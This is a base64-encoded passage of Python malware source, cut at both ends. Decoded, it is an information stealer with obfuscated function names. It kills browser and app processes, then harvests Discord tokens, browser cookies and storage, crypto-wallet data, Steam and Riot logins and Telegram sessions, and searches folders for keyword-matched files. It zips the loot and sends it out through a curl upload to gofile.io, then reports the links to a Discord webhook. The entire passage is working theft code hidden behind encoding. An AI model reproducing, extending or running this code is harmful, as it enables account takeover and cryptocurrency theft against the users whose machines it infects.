ZGVkID0gRDNDcllQN1Y0MVUzKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBDSDNDSzcwSzNOKHRva2VuRGVjb2RlZCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFQwSzNOczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUMEszTnMgKz0gdG9rZW5EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVVAxMDRENzBLM04odG9rZW5EZWNvZGVkLCBwYXRoKQoKZGVmIEc0N0gzcloxUDUocGF0aHMxLCBwYXRoczIsIHBhdGhzMyk6CiAgICB0aHR0aHQgPSBbXQogICAgZm9yIHdhbGxldGlkcyBpbiB3NDExMzc1OgogICAgICAgIAogICAgICAgIGZvciBwYXR0IGluIHBhdGhzMToKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxUDdIMU42NSwgYXJncz1bcGF0dFswXSwgcGF0dFs1XStzdHIod2FsbGV0aWRzWzBdKSwgcGF0dFsxXV0pCiAgICAgICAgICAgIGEuc3RhcnQoKQogICAgICAgICAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHBhdHQgaW4gcGF0aHMyOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aMVA3SDFONjUsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFQNzMxMzZyNE0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgYS5zdGFydCgpCiAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6CiAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgZ2xvYmFsIFc0MTEzNzVaMXAsIEc0TTFONloxcCwgTzdIM3JaMXAKICAgIHdhbCwgZ2EsIG90ID0gIiIsJycsJycKICAgIGlmIG5vdCBsZW4oVzQxMTM3NVoxcCkgPT0gMDoKICAgICAgICB3YWwgPSAiPDpFVEg6OTc1NDM4MjYyMDUzMjU3MjM2PiAg4oCiICBXYWxsZXRzXG4iCiAgICAgICAgZm9yIGkgaW4gVzQxMTM3NVoxcDoKICAgICAgICAgICAgd2FsICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIKICAgIGlmIG5vdCBsZW4oRzRNMU42WjFwKSA9PSAwOgogICAgICAgIGdhID0gIjw6YmxhY2tnZW5nYXI6MTExMTM2NjkwMDY5MDIwMjYyND4gIOKAoiAgR2FtaW5nOlxuIgogICAgICAgIGZvciBpIGluIEc0TTFONloxcDoKICAgICAgICAgICAgZ2EgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihPN0gzcloxcCkgPT0gMDoKICAgICAgICBvdCA9ICI8OmJsYWNrX3BsYW5ldDoxMDk1NzQwMjc2ODUwNTY5MjI2PiAg4oCiICBBcHBzXG4iCiAgICAgICAgZm9yIGkgaW4gTzdIM3JaMXA6CiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogR0xJTkZPLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgInRpdGxlIjogZiJ7Y25hbWV9IHwgQXBwIHt3b3Jkc30iLAogICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmInt3YWx9XG57Z2F9XG57b3R9IiwKICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogZiJ7Zm9vdGVyY30iLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvMTExMTM2NDAyNDQwODQ5NDE0MC8xMTExMzY0MTgxMDMyMTc3NzY2L2NzLnBuZyIKICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAidXNlcm5hbWUiOiBmIntjbmFtZX0gfCB0Lm1lL3tzbWFsbGNuYW1lfXIiLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvMTExMTM2NDAyNDQwODQ5NDE0MC8xMTExMzY0MTgxMDMyMTc3NzY2L2NzLnBuZyIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgIH0KICAgIAogICAgTDA0RFVyMTE4KGgwMGssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCmRlZiBaMVA3MzEzNnI0TShwYXRoLCBhcmcsIHByb2NjKToKICAgIGdsb2JhbCBPN0gzcloxcAogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQogICAgdGltZS5zbGVlcCgxKQogICAgWjFQRjAxRDNyKG5hbWUsIHBhdGhDKQoKICAgIGZvciBpIGluIHJhbmdlKDMpOgogICAgICAgIGxuaWsgPSBVUDEwNEQ3MDYwRjExMyhmJ3t0ZW1wfS97bmFtZX0uemlwJykKICAgICAgICBpZiAiaHR0cHM6Ly8iIGluIHN0cihsbmlrKToKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKDQpCiAgICBvcy5yZW1vdmUoZiJ7dGVtcH0ve25hbWV9LnppcCIpCiAgICBPN0gzcloxcC5hcHBlbmQoW2FyZywgbG5pa10pCgpkZWYgWjFQN0gxTjY1KHBhdGgsIGFyZywgcHJvY2MpOgogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICAKICAgIGdsb2JhbCBXNDExMzc1WjFwLCBHNE0xTjZaMXAsIE83SDNyWjFwCiAgICBmb3Igd2FsbGx0cyBpbiB3NDExMzc1OgogICAgICAgIGlmIHN0cih3YWxsbHRzWzBdKSBpbiBhcmc6CiAgICAgICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgICAgICBuYW1lID0gZiJ7c3RyKHdhbGxsdHNbMV0pfV97YnJvd3Nlcn0iCiAgICAgICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mID5udWwgMj4mMSIsIHNoZWxsPVRydWUpCiAgICB0aW1lLnNsZWVwKDEpCgogICAgaWYgIldhbGxldCIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZCA9IFRydWUKICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgbmFtZSA9IGFyZwoKICAgIFoxUEYwMUQzcihuYW1lLCBwYXRoQykgCgogICAgZm9yIGkgaW4gcmFuZ2UoMyk6CiAgICAgICAgbG5payA9IFVQMTA0RDcwNjBGMTEzKGYne3RlbXB9L3tuYW1lfS56aXAnKQogICAgICAgIGlmICJodHRwczovLyIgaW4gc3RyKGxuaWspOmJyZWFrCiAgICAgICAgdGltZS5zbGVlcCg0KQoKICAgIG9zLnJlbW92ZShmInt0ZW1wfS97bmFtZX0uemlwIikKICAgIGlmICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzLyIgaW4gYXJnIG9yICIvSG91Z2FCb3VnYS8iICBpbiBhcmcgb3IgIndhbGxldCIgaW4gYXJnLmxvd2VyKCk6CiAgICAgICAgVzQxMTM3NVoxcC5hcHBlbmQoW25hbWUsIGxuaWtdKQogICAgZWxpZiAiU3RlYW0iIGluIG5hbWUgb3IgIlJpb3RDbGkiIGluIG5hbWU6CiAgICAgICAgRzRNMU42WjFwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICBlbHNlOgogICAgICAgIE83SDNyWjFwLmFwcGVuZChbbmFtZSwgbG5pa10pCgpkZWYgUzc0cjc3SHIzNEQobWV0aCwgYXJncyA9IFtdKToKICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1tZXRoLCBhcmdzPWFyZ3MpCiAgICBhLnN0YXJ0KCkKICAgIFRIcjM0RDExNTcuYXBwZW5kKGEpCgpkZWYgRzQ3SDNyNDExKCk6CiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgICAgIFBhc3N3b3JkL0NDIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgJwogICAgYnIwVzUzclA0N0g1ID0gWyAgICAKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIE5lb24vVXNlciBEYXRhL0RlZmF1bHQiLCAgIm9wZXJhLmV4ZSIsICAgICAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzLyIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0LyIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzLyIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIEJldGEvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQvIiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgRGV2L1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBVbnN0YWJsZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0LyIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzLyIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIENhbmFyeS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQvIiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vVml2YWxkaS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ2aXZhbGRpLmV4ZSIsICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0LyIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzLyIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9ZYW5kZXgvWWFuZGV4QnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgInlhbmRleC5leGUiLCAgICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQvIiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS8iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyQ2FuYXJ5L1VzZXIgRGF0YSIsICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXJEZXZlbG9wZXIvVXNlciBEYXRhIiwgICAgICAgICJ5YW5kZXguZXhlIiwgICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0LyIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0hvdWdhQm91Z2EvIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9ZYW5kZXgvWWFuZGV4QnJvd3NlckJldGEvVXNlciBEYXRhIiwgICAgICAgICAgICAgInlhbmRleC5leGUiLCAgICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQvIiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS8iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyVGVjaC9Vc2VyIERhdGEiLCAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXJTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICJ5YW5kZXguZXhlIiwgICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0LyIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0hvdWdhQm91Z2EvIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9NaWNyb3NvZnQvRWRnZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgImVkZ2UuZXhlIiwgICAgICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvIiAgICAgICAgICAgICAgXQogICAgXQogICAgZDE1QzByRFA0N0g1ID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkIiwgICAgICAgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTGlnaHRjb3JkIiwgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRjYW5hcnkiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgICAgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgIF0KCiAgICBwNDdINTcwWjFQID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJBdG9taWMgV2FsbGV0LmV4ZSIsICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vR3VhcmRhL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiR3VhcmRhLmV4ZSIsICAgICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L1pjYXNoIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlpjYXNoLmV4ZSIsICAgICAgICAgICAgICAgICJXYWxsZXQiICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9Bcm1vcnkiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJBcm1vcnkuZXhlIiwgICAgICAgICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vYnl0ZWNvaW4iLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYnl0ZWNvaW4uZXhlIiwgICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkV4b2R1cy5leGUiLCAgICAgICAgICAgICAgICJXYWxsZXQiICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9CaW5hbmNlL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCaW5hbmNlLmV4ZSIsICAgICAgICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vY29tLmxpYmVydHkuamF4eC9JbmRleGVkREIvZmlsZV9fMC5pbmRleGVkZGIubGV2ZWxkYiIsICAgICAiSmF4eC5leGUiLCAgICAgICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0VsZWN0cnVtL3dhbGxldHMiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVsZWN0cnVtLmV4ZSIsICAgICAgICAgICAgICJXYWxsZXQiICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9Db2lub21pL0NvaW5vbWkvd2FsbGV0cyIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJDb2lub21pLmV4ZSIsICAgICAgICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwKICAgICAgICBbIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcU3RlYW1cY29uZmlnIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic3RlYW0uZXhlIiwgICAgICAgICAgICAgICAgIlN0ZWFtIiAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9SaW90IEdhbWVzL1Jpb3QgQ2xpZW50L0RhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJpb3RDbGllbnRTZXJ2aWNlcy5leGUiLCAgICJSaW90Q2xpZW50IiAgICBdLAogICAgXQogICAgdDMxMzZyNE0gPSBbZiJ7cm9hbWluZ30vVGVsZWdyYW0gRGVza3RvcC90ZGF0YSIsICdUZWxlZ3JhbS5leGUnLCAiVGVsZWdyYW0iXQoKCiAgICBmb3IgcGF0dCBpbiBicjBXNTNyUDQ3SDU6CiAgICAgICBTNzRyNzdIcjM0RChHMzc3MEszTiwgICBbcGF0dFswXSwgcGF0dFsyXV0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgIGZvciBwYXR0IGluIGQxNUMwckRQNDdINToKICAgICAgIFM3NHI3N0hyMzREKEczN0QxNUMwckQsIFtwYXR0WzBdLCBwYXR0WzFdXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgUzc0cjc3SHIzNEQoRzM3OHIwVzUzcjUsICAgW2JyMFc1M3JQNDdINSxdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICBTNzRyNzdIcjM0RChHNDdIM3JaMVA1LCAgICBbYnIwVzUzclA0N0g1LCBwNDdINTcwWjFQLCB0MzEzNnI0TV0gICAgICAgICAgICAgICAgICkKICAgIGZvciB0aHJlYWQgaW4gVEhyMzREMTE1NzoKICAgICAgICB0aHJlYWQuam9pbigpCiAgICAKZGVmIFVQMTA0RDcwNjBGMTEzKHBhdGgpOgogICAgdHJ5OgogICAgICAgIHIgPSBzdWJwcm9jZXNzLlBvcGVuKGYiY3VybCAtRiBcImZpbGU9QHtwYXRofVwiIGh0dHBzOi8ve2dvZmlsZXNlcnZlcn0uZ29maWxlLmlvL3VwbG9hZEZpbGUiLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKS5jb21tdW5pY2F0ZSgpCiAgICAgICAgcmV0dXJuIGxvYWRzKHJbMF0uZGVjb2RlKCd1dGYtOCcpKVsiZGF0YSJdWyJkb3dubG9hZFBhZ2UiXQogICAgZXhjZXB0OiByZXR1cm4gRmFsc2UKCmRlZiBLMVcxRjAxRDNyKHBhdGhGLCBrZXl3b3Jkcyk6CiAgICBnbG9iYWwgSzFXMUYxMTNzCiAgICBtYXhmaWxlc3BlcmRpciA9IDcKICAgIGkgPSAwCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoRikKICAgIGZmb3VuZCA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoRiArICIvIiArIGZpbGUpOiByZXR1cm4KICAgICAgICBpICs9IDEKICAgICAgICBpZiBpIDw9IG1heGZpbGVzcGVyZGlyOgogICAgICAgICAgICB1cmwgPSBVUDEwNEQ3MDYwRjExMyhwYXRoRiArICIvIiArIGZpbGUpCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawogICAgSzFXMUYxMTNzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQoKSzFXMUYxMTNzID0gW10KZGVmIEsxVzFGMTEzKHBhdGgsIGtleXdvcmRzKToKICAgIGdsb2JhbCBLMVcxRjExM3MKICAgIGZpZm91bmQgPSBbXQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgZm9yIHdvcmYgaW4ga2V5d29yZHM6CiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCBvcy5zdGF0KHBhdGggKyAiLyIgKyBmaWxlKS5zdF9zaXplIDwgNTAwMDAwIGFuZCBub3QgIi5sbmsiIGluIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlmb3VuZC5hcHBlbmQoW3BhdGggKyAiLyIgKyBmaWxlLCBVUDEwNEQ3MDYwRjExMyhwYXRoICsgIi8iICsgZmlsZSldKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToKICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwYXRoICsgIi8iICsgZmlsZQogICAgICAgICAgICAgICAgICAgIEsxVzFGMDFEM3IodGFyZ2V0LCBrZXl3b3JkcykKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgIEsxVzFGMTEzcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCmRlZiBLMVc